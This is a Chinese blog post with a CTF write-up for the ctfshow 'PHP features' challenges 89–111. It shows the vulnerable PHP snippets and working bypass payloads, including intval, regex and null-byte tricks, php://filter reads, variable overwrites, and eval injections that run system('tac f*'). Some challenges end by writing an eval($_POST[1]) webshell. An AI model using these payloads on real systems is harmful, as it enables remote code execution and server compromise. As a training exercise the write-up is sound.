<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">ctfshow-php特性 | Pp1ove</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "さくら荘そのPp1ove";
  mashiro_option.author_name = "Pp1ove";
  mashiro_option.site_url = "https://pp1ove.github.io/";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>

  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
  <script type="text/javascript">
  var bg = "/img/cover/2.jpg,/img/cover/3.jpg,/img/cover/4.jpg,/img/cover/5.jpg,/img/cover/6.jpg,/img/cover/7.jpg,/img/cover/8.jpg,/img/cover/9.jpg,/img/cover/10.jpg".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}

  </style>

</head>
</html>

<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://pp1ove.github.io/">
          <img src="/img/custom/head.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>南风过境，十里春风不如你！</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="http://github.com/Pp1ove" target="_blank" class="social-github" title="github">
                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://space.bilibili.com/195675276" target="_blank" class="social-github" title="bilibili">
                    <img src="/img/social/bilibili.png">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/wechat.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/wechat.jpg">
                  </div>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="/img/social/qq.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/qq.jpg">
                  </div>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">さくら荘その</span>
            <span class="shironeko">Pp1ove</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/技术/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/复现/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          复现
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/学科/">
                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
                          学科
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/题目/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          题目
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/bangumi/">
                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                          番组
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/图集/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/client/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
                    客户端
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img lazyload" style="background-image: url(\img\article\7.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\7.png">
    </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      ctfshow-php特性</h1>
      <p class="entry-census">
        <span>
          <a href="">
            <img src="\img\custom\head.jpg">
          </a>
        </span>
        <span>
          <a href="">Pp1ove</a>
        </span>
        <span class="bull">
        ·</span>
        2021-1-28<span class="bull">
        ·</span>
      <span id="busuanzi_value_page_pv"></span>次阅读</p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <p>参考链接：<a href="https://www.freebuf.com/articles/web/261802.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/261802.html</a></p>
<h2 id="89-数组绕过intval"><a href="#89-数组绕过intval" class="headerlink" title="89 数组绕过intval"></a>89 数组绕过intval</h2><pre><code class="PHP">include(&quot;flag.php&quot;);
highlight_file(__FILE__);

if(isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if(c(&quot;/[0-9]/&quot;, $num)){
        die(&quot;no no no!&quot;);
    }
    if(intval($num)){
        echo $flag;
    }
}
</code></pre>
<p><img src="/2021/01/28/ctfshow-php特性/image-20210128114216321.png" alt="image-20210128114216321"></p>
<p><img src="/2021/01/28/ctfshow-php特性/image-20210128112730056.png" alt="image-20210128112730056"></p>
<p>利用数组绕过</p>
<p>payload:<code>num[]=1</code></p>
<h2 id="90-intval-num-0"><a href="#90-intval-num-0" class="headerlink" title="90 intval($num,0)"></a>90 intval($num,0)</h2><pre><code class="PHP">include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if($num===&quot;4476&quot;){
        die(&quot;no no no!&quot;);
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
</code></pre>
<p>使用16进制绕过</p>
<h2 id="91-m多行匹配"><a href="#91-m多行匹配" class="headerlink" title="91 /m多行匹配"></a>91 /m多行匹配</h2><pre><code class="php">show_source(__FILE__);
include(&#39;flag.php&#39;);
$a=$_GET[&#39;cmd&#39;];
if(preg_match(&#39;/^php$/im&#39;, $a)){
    if(preg_match(&#39;/^php$/i&#39;, $a)){
        echo &#39;hacker&#39;;
    }
    else{
        echo $flag;
    }
}
else{
    echo &#39;nonononono&#39;;
} 
</code></pre>
<p>这里考了一个 /m多行匹配</p>
<p>所以第一个if其实是任意一行满足就行,而第二个if只能匹配第一行</p>
<p>payload：<code>?cmd=%0Aphp</code></p>
<h2 id="92-intval-num-0"><a href="#92-intval-num-0" class="headerlink" title="92 intval($num,0)"></a>92 intval($num,0)</h2><pre><code class="php">
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if($num==4476){
        die(&quot;no no no!&quot;);
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
</code></pre>
<p>16进制绕过</p>
<h2 id="93"><a href="#93" class="headerlink" title="93"></a>93</h2><pre><code class="php">include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if($num==4476){
        die(&quot;no no no!&quot;);
    }
    if(preg_match(&quot;/[a-z]/i&quot;, $num)){
        die(&quot;no no no!&quot;);
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
</code></pre>
<p>八进制绕过</p>
<h2 id="94-strpos"><a href="#94-strpos" class="headerlink" title="94 strpos"></a>94 strpos</h2><pre><code class="php">include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if($num===&quot;4476&quot;){
        die(&quot;no no no!&quot;);
    }
    if(preg_match(&quot;/[a-z]/i&quot;, $num)){
        die(&quot;no no no!&quot;);
    }
    if(!strpos($num, &quot;0&quot;)){
        die(&quot;no no no!&quot;);
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
</code></pre>
<p><img src="/2021/01/28/ctfshow-php特性/1999159-20201011152911526-1511795862.png" alt="img"></p>
<pre><code>对于strpos()函数，我们可以利用换行进行绕过（%0a）

payload:?num=%0a010574

也可以小数点绕过

payload：?num=4476.0

因为intval()函数只读取整数部分

还可以八进制绕过(%20是空格的url编码形式)

payload：?num=%20010574
当然其实 %09，%0b，+等都可以绕过
</code></pre><h2 id="95"><a href="#95" class="headerlink" title="95"></a>95</h2><pre><code class="php">&lt;?php

include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if($num==4476){
        die(&quot;no no no!&quot;);
    }
    if(preg_match(&quot;/[a-z]|\./i&quot;, $num)){
        die(&quot;no no no!!&quot;);
    }
    if(!strpos($num, &quot;0&quot;)){
        die(&quot;no no no!!!&quot;);
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
</code></pre>
<p>多过滤了一个  .  和上题一样,只不过不能用小数绕过了</p>
<h2 id="96"><a href="#96" class="headerlink" title="96"></a>96</h2><pre><code class="PHP">highlight_file(__FILE__);
if(isset($_GET[&#39;u&#39;])){
    if($_GET[&#39;u&#39;]==&#39;flag.php&#39;){
        die(&quot;no no no&quot;);
    }else{
        highlight_file($_GET[&#39;u&#39;]);
    }
}
</code></pre>
<pre><code>/var/www/html/flag.php              绝对路径
./flag.php                          相对路径
php://filter/resource=flag.php      php伪协议    
</code></pre><h2 id="97-md5"><a href="#97-md5" class="headerlink" title="97 md5"></a>97 md5</h2><pre><code class="PHP">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) {
if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])
if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
echo $flag;
else
print &#39;Wrong.&#39;;
}
?&gt;
</code></pre>
<p>MD5碰撞或者数组绕过</p>
<h2 id="98"><a href="#98" class="headerlink" title="98"></a>98</h2><pre><code class="php">include(&quot;flag.php&quot;);
$_GET?$_GET=&amp;$_POST:&#39;flag&#39;;
$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;
$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;;
highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);
?&gt; 
</code></pre>
<p>主要是三元运算符和变量覆盖</p>
<p>$_GET?$_GET=&amp;$_POST:’flag’;   意思就是说如果存在GET请求，则将POST请求覆盖掉GET请求</p>
<p>highlight_file($_GET[‘HTTP_FLAG’]==’flag’?$flag: <strong>FILE </strong>);   意思就是说GET传参HTTP_FLAG的值为flag，则读取flag？</p>
<p>所以我就构造了GET：?flag=123</p>
<p>POST：HTTP_FLAG=flag</p>
<h2 id="99-in-array弱类型比较"><a href="#99-in-array弱类型比较" class="headerlink" title="99 in_array弱类型比较"></a>99 in_array弱类型比较</h2><pre><code class="php">highlight_file(__FILE__);
$allow = array();
for ($i=36; $i &lt; 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow)){
    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
}

?&gt; 
</code></pre>
<p>考察点：php弱类型比较</p>
<pre><code class="php">$allow = array(1,&#39;2&#39;,&#39;3&#39;);
var_dump(in_array(&#39;1.php&#39;,$allow));
返回的为true

$allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);
var_dump(in_array(&#39;1.php&#39;,$allow));
返回false
</code></pre>
<p>in_array延用了php中的==<br> 具体内容可以查看php手册-&gt;附录-&gt;<strong>PHP类型比较表</strong><br> 因为新加进去的随机数字每次都包含1，1存在的几率是最大的。<br> 所以直接写 <code>n=1.php post:content=&lt;?php eval($_POST[1]);?&gt;</code>多试几次即可</p>
<h2 id="100-101-and与-amp-amp-与-优先级"><a href="#100-101-and与-amp-amp-与-优先级" class="headerlink" title="100.101         and与&amp;&amp;与=优先级"></a>100.101         and与&amp;&amp;与=优先级</h2><pre><code class="php">highlight_file(__FILE__);
include(&quot;ctfshow.php&quot;);
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET[&#39;v1&#39;];
$v2=$_GET[&#39;v2&#39;];
$v3=$_GET[&#39;v3&#39;];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match(&quot;/\;/&quot;, $v2)){
        if(preg_match(&quot;/\;/&quot;, $v3)){
            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
        }
    }
}

?&gt;
</code></pre>
<p>知识点一：and 与 &amp;&amp;</p>
<p>原本以为两个都是一样的,但其实运算级有区别,因为赋值运算的优先级比AND和OR的高，所以先赋值；比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值。</p>
<p>所以这里其实只需要is_numberic($v1)为真就行</p>
<p>知识点二: ReflectionClass 类</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109168454" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/109168454</a></p>
<p>payload:<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p>
<p>100非预期解1</p>
<pre><code>直接输出$ctfshow;构造出 var_dump($ctfshow);
payload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;
</code></pre><p>100非预期解2</p>
<pre><code>因为过滤的字符比较少，所以可以直接执行命令。
方法不固定，在此聚两个例子
v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/
v1=1&amp;v2=-system(&#39;ls&#39;)-&amp;v3=-1;
</code></pre><h2 id="102-103"><a href="#102-103" class="headerlink" title="102-103"></a>102-103</h2><pre><code class="php">highlight_file(__FILE__);
$v1 = $_POST[&#39;v1&#39;];
$v2 = $_GET[&#39;v2&#39;];
$v3 = $_GET[&#39;v3&#39;];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die(&#39;hacker&#39;);
}
?&gt; 

</code></pre>
<p>搬运师傅们的吧</p>
<p>先来说下题目本意<br> is_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的。</p>
<pre><code class="php">var_dump(is_numeric(&quot;0x66&quot;));  php5的环境下返回true  php7返回false
</code></pre>
<p>之后经过截断我们就得到了16进制，而且是不带0x的，这时候就可以通过调用函数hex2bin将16进制转换成字符串从而写入木马文件。（hex2bin如果参数带0x会报错）<br> 具体做法：<br> 首先将我们的一句话编码成16进制</p>
<pre><code>&lt;?php eval($_POST[1]);?&gt;
0x3c3f706870206576616c28245f504f53545b315d293b3f3e
</code></pre><p>接着直接传入v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php<br> post:v1=hex2bin<br> 即可完成木马的写入。</p>
<p>本地测试成功写入木马。<br> 但是该题环境没有设置好用的是php7，所以我们还是得找到另外一种方法绕过。<br> 虽然文件内容不好控制，但是可以利用伪协议将内容进行编码转换。<br> 所以如果能找到一条php语句经过base64编码，在转换为16进制之后全部都是数字不就可以通过了吗？<br> 也就是说</p>
<pre><code class="php">$a=&quot;xxx&quot;;
$b=base64_encode($a);
$c=bin2hex($b);
如果$c全部都是纯数字就可以了。
1234
</code></pre>
<p>这里直接借用其他师傅的payload</p>
<pre><code class="php">$a=&#39;&lt;?=`cat *`;&#39;;
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //这里直接用去掉=的base64
输出   5044383959474e6864434171594473

带e的话会被认为是科学计数法，可以通过is_numeric检测。
大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。
1234567
</code></pre>
<p>最终payload：<code>v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin</code></p>
<h2 id="104"><a href="#104" class="headerlink" title="104"></a>104</h2><pre><code class="php">highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){
    $v1 = $_POST[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
?&gt; 
</code></pre>
<p>sha1碰撞，使用数组</p>
<h2 id="105"><a href="#105" class="headerlink" title="105"></a>105</h2><pre><code class="php">highlight_file(__FILE__);
include(&#39;flag.php&#39;);
error_reporting(0);
$error=&#39;你还想要flag嘛？&#39;;
$suces=&#39;既然你想要那给你吧！&#39;;
foreach($_GET as $key =&gt; $value){
    if($key===&#39;error&#39;){
        die(&quot;what are you doing?!&quot;);
    }
    $$key=$$value;
}foreach($_POST as $key =&gt; $value){
    if($value===&#39;flag&#39;){
        die(&quot;what are you doing?!&quot;);
    }
    $$key=$$value;
}
if(!($_POST[&#39;flag&#39;]==$flag)){
    die($error);
}
echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
die($suces);
?&gt; 
</code></pre>
<p>这里用了foreach进行变量覆盖</p>
<p><img src="/2021/01/28/ctfshow-php特性/image-20210128165609448.png" alt="image-20210128165609448"></p>
<p>将$error = $flag</p>
<p>成果在die($error)中输出</p>
<h2 id="106-107"><a href="#106-107" class="headerlink" title="106-107"></a>106-107</h2><pre><code class="php">highlight_file(__FILE__);
include(&quot;flag.php&quot;);

if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){
    $v1 = $_POST[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];
    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){
        echo $flag;
    }
}
?&gt;
</code></pre>
<p>数组,碰撞</p>
<h2 id="108"><a href="#108" class="headerlink" title="108"></a>108</h2><pre><code class="PHP">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  {
    die(&#39;error&#39;);

}
//只有36d的人才能看到flag
if(intval(strrev($_GET[&#39;c&#39;]))==0x36d){
    echo $flag;
}

?&gt;
</code></pre>
<ul>
<li>ereg — 正则表达式匹配</li>
<li>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，<strong>导致了正则过滤被绕过,所以可以使用%00截断正则匹配</strong></li>
</ul>
<pre><code>0x36d是 877
</code></pre><p>所以构造</p>
<pre><code>?c=a%00aaaa778
</code></pre><p>当通过<code>strrev</code>和<code>intval</code>的时候，为 877</p>
<h2 id="109"><a href="#109" class="headerlink" title="109"></a>109</h2><pre><code class="PHP">highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){
    $v1 = $_GET[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];

    if(preg_match(&#39;/[a-zA-Z]+/&#39;, $v1) &amp;&amp; preg_match(&#39;/[a-zA-Z]+/&#39;, $v2)){
            eval(&quot;echo new $v1($v2());&quot;);
    }

}

?&gt; 
</code></pre>
<p>考察点：php 异常类<br> 先来看下这个正则表达式<code>/[a-zA-Z]+/</code> 匹配<strong>至少有一个字母</strong>的字符串<br> 所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。<br> 举两个例子</p>
<pre><code>Exception
ReflectionClas
</code></pre><p>new 之后我们就可以执行里面的system函数,虽然最后Reflection(system(‘tac f<em>‘)())会报错,但其实已经不影响我们执行system(‘tac f\</em>‘)</p>
<pre><code>payload:
v1=Exception();system(&#39;tac f*&#39;);//&amp;v2=a
v1=ReflectionClass&amp;v2=system(&#39;tac f*&#39;)
</code></pre><h2 id="110"><a href="#110" class="headerlink" title="110"></a>110</h2><pre><code class="php">
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){
    $v1 = $_GET[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];

    if(preg_match(&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;, $v1)){
            die(&quot;error v1&quot;);
    }
    if(preg_match(&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;, $v2)){
            die(&quot;error v2&quot;);
    }

    eval(&quot;echo new $v1($v2());&quot;);

}

?&gt; 
</code></pre>
<p><strong>利用</strong> <strong>FilesystemIterator</strong> <strong>获取指定目录下的所有文件</strong></p>
<p><a href="http://phpffff.com/fifilesystemiterator" target="_blank" rel="noopener">http://phpffff.com/fifilesystemiterator</a></p>
<p><a href="https://www.php.net/manual/zh/class.fifilesystemiterator.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/class.fifilesystemiterator.php</a></p>
<p>getcwd()函数 获取当前工作目录 返回当前工作目录</p>
<p>payload: ?v1=FilesystemIterator&amp;v2=getcwd</p>
<h2 id="111"><a href="#111" class="headerlink" title="111"></a>111</h2><pre><code class="php">highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

function getFlag(&amp;$v1,&amp;$v2){
    eval(&quot;$$v1 = &amp;$$v2;&quot;);
    var_dump($$v1);
}


if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){
    $v1 = $_GET[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];

    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v1)){
            die(&quot;error v1&quot;);
    }
    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v2)){
            die(&quot;error v2&quot;);
    }

    if(preg_match(&#39;/ctfshow/&#39;, $v1)){
            getFlag($v1,$v2);
    }





}

?&gt; 
</code></pre>
<p>考察点：php超全局变量$GLOBALS的使用</p>
<p>介绍</p>
<pre><code class="php">$GLOBALS — 引用全局作用域中可用的全部变量
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
</code></pre>
